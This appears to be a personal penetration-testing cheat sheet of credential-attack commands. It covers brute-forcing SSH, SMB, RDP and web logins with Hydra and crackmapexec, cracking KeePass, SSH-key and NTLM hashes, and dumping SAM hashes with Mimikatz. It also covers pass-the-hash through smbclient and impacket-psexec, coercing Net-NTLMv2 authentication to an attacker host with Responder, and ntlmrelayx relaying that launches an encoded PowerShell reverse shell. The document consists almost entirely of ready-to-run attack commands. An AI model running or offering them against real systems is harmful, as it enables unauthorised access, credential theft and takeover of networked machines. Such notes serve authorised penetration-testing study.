## Hydra & crackmapexec
---
### SSH

```shell
hydra -L admin -P /usr/share/wordlist/rockyou.txt <target-ip> ssh -t 4
```

```shell
sudo crackmapexec ssh <target-ip> -u userlist.txt -p password.list
```

### SMB

```shell
sudo crackmapexec smb <target-ip> -u users.txt -p passwords.txt -d domain.com
```

```shell
sudo crackmapexec smb $SUBNET_TARGET/24  -u users.txt -p passwords.txt -d medtech.com --continue-on-success

sudo crackmapexec smb $SUBNET_TARGET/24  -u users.txt -p passwords.txt -d medtech.com --continue-on-success | grep "[+]"
```

### RDP

```shell
hydra -L Administrator -P /usr/share/wordlist/rockyou.txt <target-ip> rdp -t 4
```

```shell
sudo crackmapexec rdp <target-ip> -u userlist.txt -p password.list -d domain.com
```

```shell
sudo crackmapexec rdp $SUBNET_TARGET/24  -u users.txt -p passwords.txt -d medtech.com --continue-on-success

sudo crackmapexec rdp $SUBNET_TARGET/24  -u users.txt -p passwords.txt -d medtech.com --continue-on-success | grep "[+]"
```

### HTTP Basic Auth

```shell
hydra -l admin -P /usr/share/wordlist/rockyou.txt  <target-ip> http-get
```

### HTTP POST Login Form

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"

hydra -I -V -l admin -P /usr/share/wordlists/rockyou.txt -t 1 "http-get://$IP/:A=BASIC:F=401"
```

## Cracking Password
---
### Customized mutating wordlist

```text
c $1
c $!
```

### Hashcat

```shell
hashcat --wordlist=/usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/my-rule.rule user.hash

hashcat --wordlist=/usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule user.hash --force
```

### John

```shell
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=/usr/share/hashcat/rules/my-rule.rule user.hash 

john --wordlist=/usr/share/wordlists/rockyou.txt --rules=/usr/share/hashcat/rules/best64.rule user.hash 
```

## KeePass file
---

```shell
keepass2john Database.kdbx > keepass.hash
```

```shell
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

## SSH Keys
---

```shell
ssh2john id_rsa > id_rsa.hash
```

```shell
john --wordlist=ssh.passwords --rules=sshRules id_rsa.hash
```

## NTLM Hashes
---
### Mimikatz

```powershell
.\mimikatz.exe
```

Warning: Mimikatz's commands could not work depending on the Windows version. Make sure to download the correct version after checking with `systeminfo` the Windows version.

Then, if we have the privileges, it can be used to dump NTLM hashes with:

```powershell
privilege::debug
token::elevate
lsadump::sam
```

To impersonate another user:

```powershell
 sekurlsa::pth /user:Administrator /domain:<DOMAI> /ntlm:<NTLM-HASH> /impersonate
```

### Cracking the NTLM hashes

```shell
hashcat -m 1000 user.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### Passing the NTLM hashes

The NTLM hashe can be used also as is if the protocol supports it. An example is SMB

```shell
smbclient \\\\<TARGET-IP>\\secrets -U Administrator --pw-nt-hash <NTLM-HASH>
```

We can escalate the writables shares with `impacket-psexec`, a oneliner tool that opens a reverse shell with the exploited target.

```shell
impacket-psexec -hashes 00000000000000000000000000000000:<NTLM-HASH> Administrator@<TARGET-IP>
```

### Cracking the Net-NTLMv2 hashes

One of the authentication protocols Windows machines use to authenticate across the network is a challenge / response / validation called Net-NTLMv2. If can get a Windows machine to engage my machine with one of these requests, we can perform an offline cracking to attempt to retrieve their password. In some cases, we could also do a relay attack to authenticate directly to some other server in the network.

Once identified our interface, we can start our interceptor with

```shell
sudo responder -I <INTERFACE>
```

And from the Victim we only need to mount as a SMB share a fake provided path

```powershell
dir \\<ATTACKER-IP>\test
```

In this way `responder` will dump the hash that could be cracked with code **5600** on hashcat

```shell
hashcat -m 5600 user.hash /usr/share/wordlists/rockyou.txt --force
```

### Relaying the Net-NTLMv2 hashes

We can perform a `ntlmrelayx` attack if the gained hash is too difficult to be cracked. In this case the `<TARGET-IP>` is the second exploitable machine on the network.

```shell
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET-IP> -c "powershell -enc <ENCODED-REVSHELL>"
```

The encoded reverse shell can be crafted with some UTF16-BE malicious code crafted with [https://www.revshells.com](https://www.revshells.com/). Then, we have to gain the hash from the first machine. We can do the same attack as before, mounting on the machine 1 the fake SMB share, in order to gain the hash.

```powershell
dir \\<ATTACKER-IP>\test
```

Now we `impacket-ntlmrelayx` will pass the hash to the second machine to authenticate us with the same hash. If the user is also the Administrator of the second machine, we will be logged as Administrator.